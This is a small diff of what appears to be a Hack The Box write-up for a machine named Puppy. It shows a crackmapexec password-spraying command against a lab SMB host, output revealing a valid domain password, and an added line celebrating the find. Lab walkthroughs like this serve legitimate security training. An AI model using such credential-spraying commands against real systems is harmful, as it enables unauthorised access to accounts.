@@ -288,5 +288,7 @@ crackmapexec smb 10.129.232.75 -u users.txt -p passwords.txt --continue-on-succe
 SMB                      10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
 ```
 
+Success! We have found ant.edwards SMB password.
+
 ## ant.edwards -> adam.silver
 
